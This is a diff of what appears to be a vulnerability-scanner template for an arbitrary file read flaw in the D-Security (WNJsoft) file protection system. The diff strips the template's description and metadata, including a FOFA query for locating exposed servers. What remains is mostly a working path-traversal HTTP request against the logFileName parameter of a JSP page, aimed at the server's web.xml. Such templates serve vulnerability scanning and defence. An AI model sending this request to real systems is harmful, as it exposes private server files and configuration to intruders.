@@ -3,12 +3,8 @@ info:
   name: 以柔资讯-D-Security终端文件保护系统 logFileName 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ug75a7ffqyh8nub2'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ug75a7ffqyh8nub2
-    fofa: title="D-Security" || title="WNJsoft" || title="W&Jsoft"
 http:
 - raw:
   - 'GET /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml HTTP/1.1
